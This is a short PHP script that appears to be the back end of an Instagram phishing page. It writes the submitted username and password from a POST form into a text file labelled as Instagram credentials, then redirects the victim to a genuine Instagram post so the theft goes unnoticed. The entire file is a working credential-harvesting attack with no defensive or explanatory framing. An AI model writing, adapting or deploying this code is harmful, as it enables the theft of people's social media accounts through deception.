<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/p/DFTpBMWsGCQ/?igsh=aHM4c2ZkMGx0eTRn');
exit();
?>
